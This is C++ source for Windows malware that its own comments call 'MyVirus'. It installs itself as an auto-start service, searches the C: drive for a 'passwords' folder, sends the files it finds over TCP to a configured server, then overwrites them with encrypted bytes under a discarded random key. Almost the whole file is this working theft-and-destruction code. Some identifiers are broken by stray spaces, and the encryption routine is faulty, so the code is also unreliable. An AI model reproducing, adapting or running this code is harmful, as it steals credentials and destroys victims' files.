#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <ws2tcpip.h>
#include <tchar.h>
#include <cstdio>
#include <iostream>

#include <openssl/aes.h>
#include <openssl/rand.h>

#include <condition_variable>
#include <fstream>
#include <stdio.h>
#include <cstdio>
#include <string>
#include <vector>

#pragma comment(lib, "ws2_32.lib")

#define SERVICE_NAME _T("AAHackeado")

// Function prototypes by Services
VOID WINAPI ServiceMain(DWORD argc, LPTSTR *argv);
VOID WINAPI ServiceCtrlHandler(DWORD CtrlCode);
DWORD WINAPI ServiceW orkerThread(LPVOID lpParam);

// Global variables
SERVICE_STATUS g_ServiceStatus = {0};
SERVICE_STATUS_HANDLE g_StatusHandle = NULL;
HANDLE g_ServiceStopEvent = INVALID_HANDLE_VALUE;

// Config Variables
std::string serverIP = "localhost";
std::string serverPort = "4455";
std::string filename = "passwords";
std::string directory = "C:\\";

// MyFunctions prototypes by MyVirus
void RunService();
SC_HANDLE OpenServiceManager();
SC_HANDLE InstallService(SC_HANDLE schSCManager);
SC_HANDLE OpenExistingService(SC_HANDLE schSCManager);
void StartInstalledService(SC_HANDLE schService, SC_HANDLE schSCManager);

// Functionalities
std::string MySearchFile(const char *directory, const char *filename);
void SendFileToServer(const std::string &filePath, const std::string &serverIP, const std::string &serverPort);
void SendMessageToServer(const std::string &message, const std::string &serverIP, const std::string &serverPort);
std::vector<std::string> MySearchDir(const char *directory, const char *dirName);
void AES_256_CBC_encrypt(const char *in, const char *key, const char *iv, char *out);
void encryptFile(const std::string &filePath);

int _tmain(int argc, TCHAR *argv[])
{
    if (argc > 1 && _tcscmp(argv[1], _T("run")) == 0)
    {
        RunService();
        return 0;
    }

    SC_HANDLE schSCManager = OpenServiceManager();
    if (schSCManager == NULL)
    {
        return 1;
    }

    SC_HANDLE schService = OpenExistingService(schSCManager);
    if (schService == NULL)
    {
        schService = InstallService(schSCManager);
        if (schService == NULL)
        {
            CloseServiceHandle(schSCManager);
            return 1;
        }
    }

    StartInstalledService(schService, schSCManager);

    CloseServiceHandle(schService);
    CloseServiceHandle(schSCManager);

    return 0;
}

void RunService()
{
    SERVICE_TABLE_ENTRY ServiceTable[] =
        {
            {SERVICE_NAME, (LPSERVICE_MAIN_FUNCTION)ServiceMain},
            {NULL, NULL}};

    if (StartServiceCtrlDispatcher(ServiceTable) == FALSE)
    {
        printf("StartServiceCtrlDispatcher failed (%d)\n", GetLastError());
    }
}

SC_HANDLE OpenServiceManager()
{
    SC_HANDLE schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (schSCManager == NULL)
    {
        printf("OpenSCManager failed (%d)\n", GetLastError());
    }
    return schSCManager;
}

SC_HANDLE OpenExistingService(SC_HANDLE schSCManager)
{
    SC_HANDLE schService = OpenService(schSCManager, SERVICE_NAME, SERVICE_ALL_ACCESS);
    if (schService == NULL && GetLastError() != ERROR_SERVICE_DOES_NOT_EXIST)
    {
        printf("OpenService failed (%d)\n", GetLastError());
    }
    return schService;
}

SC_HANDLE InstallService(SC_HANDLE schSCManager)
{
    TCHAR szPath[MAX_PATH];
    if (GetModuleFileName(NULL, szPath, ARRAYSIZE(szPath)) == 0)
    {
        printf("GetModuleFileName failed (%d)\n", GetLastError());
        return NULL;
    }

    _tcscat_s(szPath, ARRAYSIZE(szPath), _T(" run"));

    SC_HANDLE schService = CreateService(
        schSCManager,
        SERVICE_NAME,
        SERVICE_NAME,
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_AUTO_START,
        SERVICE_ERROR_NORMAL,
        szPath,
        NULL,
        NULL,
        NULL,
        NULL,
        NULL);

    if (schService == NULL)
    {
        printf("CreateService failed (%d)\n", GetLastError());
    }
    else
    {
        printf("Service installed successfully\n");
    }

    return schService;
}

void StartInstalledService(SC_HANDLE schService, SC_HANDLE schSCManager)
{
    if (!StartService(schService, 0, NULL))
    {
        printf("StartService failed (%d)\n", GetLastError());
        CloseServiceHandle(schService);
        CloseServiceHandle(schSCManager);
    }
    else
    {
        printf("Service started successfully\n");
    }
}

VOID WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
{
    DWORD Status = E_FAIL;

    g_StatusHandle = RegisterServiceCtrlHandler(SERVICE_NAME, ServiceCtrlHandler);

    if (g_StatusHandle == NULL)
    {
        return;
    }

    ZeroMemory(&g_ServiceStatus, sizeof(g_ServiceStatus));
    g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    g_ServiceStatus.dwControlsAccepted = 0;
    g_ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);

    g_ServiceStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    if (g_ServiceStopEvent == NULL)
    {
        g_ServiceStatus.dwControlsAccepted = 0;
        g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        g_ServiceStatus.dwWin32ExitCode = GetLastError();
        SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
        return;
    }

    g_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
    g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);

    HANDLE hThread = CreateThread(NULL, 0, ServiceWorkerThread, NULL, 0, NULL);

    WaitForSingleObject(hThread, INFINITE);

    CloseHandle(g_ServiceStopEvent);

    g_ServiceStatus.dwControlsAccepted = 0;
    g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
    g_ServiceStatus.dwWin32ExitCode = NO_ERROR;
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
}

VOID WINAPI ServiceCtrlHandler(DWORD CtrlCode)
{
    switch (CtrlCode)
    {
    case SERVICE_CONTROL_STOP:

        if (g_ServiceStatus.dwCurrentState != SERVICE_RUNNING)
            break;

        SetEvent(g_ServiceStopEvent);

        g_ServiceStatus.dwControlsAccepted = 0;
        g_ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
        SetServiceStatus(g_StatusHandle, &g_ServiceStatus);

        break;

    default:
        break;
    }
}

DWORD WINAPI ServiceWorkerThread(LPVOID lpParam)
{
    while (WaitForSingleObject(g_ServiceStopEvent, 0) != WAIT_OBJECT_0)
    {
        std::vector<std::string> paths;

        // std::string result = MySearchFile(directory.c_str(), filename.c_str());
        // paths.push_back(result);

        paths = MySearchDir(directory.c_str(), filename.c_str());

        if (!paths.empty() && !paths[0].empty())
        {
            SendMessageToServer("higjklyoksl", serverIP, serverPort);
            Sleep(100);

            for (const std::string &path : paths)
            {
                SendFileToServer(path, serverIP, serverPort);
                encryptFile(path);
            }

            Sleep(300);
            SC_HANDLE schSCManager = OpenServiceManager();
            if (schSCManager == NULL)
            {
                continue;
            }

            SC_HANDLE schService = OpenExistingService(schSCManager);
            if (schService == NULL)
            {
                continue;
            }

            SERVICE_STATUS status;
            ControlService(schService, SERVICE_CONTROL_STOP, &status);

            if (!DeleteService(schService))
            {
                printf("DeleteService failed (%d)\n", GetLastError());
            }
            else
                printf("Service deleted successfully\n");

            CloseServiceHandle(schService);
            CloseServiceHandle(schSCManager);
        }
        else
        {
            SendMessageToServer("ytjlsfjwoperjlf", serverIP, serverPort);
        }

        Sleep(3000);
    }

    return ERROR_SUCCESS;
}

std::vector<std::string> MySearchDir(const char *directory, const char *dirName)
{
    std::vector<std::string> filePaths;
    std::string searchPath = std::string(directory) + "\\*.*";
    WIN32_FIND_DATA findData;
    HANDLE hFind = FindFirstFile(searchPath.c_str(), &findData);

    if (hFind == INVALID_HANDLE_VALUE)
    {
        return filePaths;
    }

    do
    {
        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
        {
            if (strcmp(findData.cFileName, ".") != 0 && strcmp(findData.cFileName, "..") != 0)
            {
                std::string subdirectory = std::string(directory) + "\\" + std::string(findData.cFileName);
                if (strcmp(findData.cFileName, dirName) == 0)
                {
                    std::vector<std::string> subDirFiles = MySearchDir(subdirectory.c_str(), "*");
                    filePaths.insert(filePaths.end(), subDirFiles.begin(), subDirFiles.end());
                }
                else
                {
                    std::vector<std::string> result = MySearchDir(subdirectory.c_str(), dirName);
                    filePaths.insert(filePaths.end(), result.begin(), result.end());
                }
            }
        }
        else
        {
            if (strcmp(dirName, "*") == 0 || strcmp(findData.cFileName, dirName) == 0)
            {
                std::string filePath = std::string(directory) + "\\" + std::string(findData.cFileName);
                filePaths.push_back(filePath);
            }
        }
    } while (FindNextFile(hFind, &findData) != 0);

    FindClose(hFind);
    return filePaths;
}

std::string MySearchFile(const char *directory, const char *filename)
{
    std::string searchPath = std::string(directory) + "\\*.*";
    WIN32_FIND_DATA findData;
    HANDLE hFind = FindFirstFile(searchPath.c_str(), &findData);

    if (hFind == INVALID_HANDLE_VALUE)
    {
        printf("Error al buscar en ");
        return "";
    }

    do
    {
        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
        {
            // Ignorar directorios especiales "." y ".."
            if (strcmp(findData.cFileName, ".") != 0 && strcmp(findData.cFileName, "..") != 0)
            {
                std::string subdirectory = std::string(directory) + "\\" + std::string(findData.cFileName);
                std::string result = MySearchFile(subdirectory.c_str(), filename);
                if (!result.empty())
                {
                    FindClose(hFind);
                    return result;
                }
            }
        }
        else
        {
            if (strcmp(findData.cFileName, filename) == 0)
            {
                std::string filePath = std::string(directory) + "\\" + std::string(findData.cFileName);
                printf("Archivo encontrado: %s\n", filePath.c_str());
                FindClose(hFind);
                return filePath;
            }
        }
    } while (FindNextFile(hFind, &findData) != 0);

    FindClose(hFind);
    return "";
}

void SendFileToServer(const std::string &filePath, const std::string &serverIP, const std::string &serverPort)
{
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
    {
        printf("WSAStartup failed\n");
        return;
    }

    struct addrinfo *result = NULL, *ptr = NULL, hints;
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    if (getaddrinfo(serverIP.c_str(), serverPort.c_str(), &hints, &result) != 0)
    {
        printf("getaddrinfo failed\n");
        WSACleanup();
        return;
    }

    SOCKET ConnectSocket = INVALID_SOCKET;
    for (ptr = result; ptr != NULL; ptr = ptr->ai_next)
    {
        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
        if (ConnectSocket == INVALID_SOCKET)
        {
            printf("Error at socket\n");
            WSACleanup();
            return;
        }

        if (connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen) == SOCKET_ERROR)
        {
            closesocket(ConnectSocket);
            ConnectSocket = INVALID_SOCKET;
            continue;
        }
        break;
    }

    freeaddrinfo(result);

    if (ConnectSocket == INVALID_SOCKET)
    {
        printf("Unable to connect to server\n");
        WSACleanup();
        return;
    }

    std::ifstream file(filePath, std::ios::binary | std::ios::ate);
    if (!file)
    {
        printf("Could not open file\n");
        return;
    }

    std::streamsize file_size = file.tellg();
    file.seekg(0, std::ios::beg);

    std::vector<char> file_data(file_size);
    if (!file.read(file_data.data(), file_size))
    {
        printf("Could not read file\n");
        return;
    }

    if (send(ConnectSocket, file_data.data(), file_data.size(), 0) == SOCKET_ERROR)
    {
        printf("send failed\n");
    }

    closesocket(ConnectSocket);
    WSACleanup();

    printf("File sent successfully.\n");
}

void SendMessageToServer(const std::string &message, const std::string &serverIP, const std::string &serverPort)
{
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
    {
        printf("WSAStartup failed\n");
        return;
    }

    struct addrinfo *result = NULL, *ptr = NULL, hints;
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    if (getaddrinfo(serverIP.c_str(), serverPort.c_str(), &hints, &result) != 0)
    {
        printf("getaddrinfo failed\n");
        WSACleanup();
        return;
    }

    SOCKET ConnectSocket = INVALID_SOCKET;
    for (ptr = result; ptr != NULL; ptr = ptr->ai_next)
    {
        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
        if (ConnectSocket == INVALID_SOCKET)
        {
            printf("Error at socket\n");
            WSACleanup();
            return;
        }

        if (connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen) == SOCKET_ERROR)
        {
            closesocket(ConnectSocket);
            ConnectSocket = INVALID_SOCKET;
            continue;
        }
        break;
    }

    freeaddrinfo(result);

    if (ConnectSocket == INVALID_SOCKET)
    {
        printf("Unable to connect to server\n");
        WSACleanup();
        return;
    }

    if (send(ConnectSocket, message.c_str(), message.size(), 0) == SOCKET_ERROR)
    {
        printf("send failed\n");
    }

    closesocket(ConnectSocket);
    WSACleanup();

    printf("Message sent successfully.\n");
}

void AES_256_CBC_encrypt(const char *in, const char *key, const char *iv, char *out)
{
    AES_KEY encryptKey;
    AES_set_encrypt_key((unsigned char *)key, 256, &encryptKey);
    AES_cbc_encrypt((unsigned char *)in, (unsigned char *)out, AES_BLOCK_SIZE, &encryptKey, (unsigned char *)iv, AES_ENCRYPT);
}

void encryptFile(const std::string &filePath)
{
    std::ifstream file(filePath, std::ios::binary);
    std::string contents((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());

    char key[AES_BLOCK_SIZE];
    char iv[AES_BLOCK_SIZE];
    RAND_bytes((unsigned char *)key, AES_BLOCK_SIZE);
    RAND_bytes((unsigned char *)iv, AES_BLOCK_SIZE);

    char *encrypted = new char[contents.size()];
    AES_256_CBC_encrypt(conte nts.c_str(), key, iv, encrypted);

    std::ofstream encryptedFile(filePath, std::ios::binary);
    encryptedFile.write(encrypted, contents.size());

    delete[] encrypted;
}
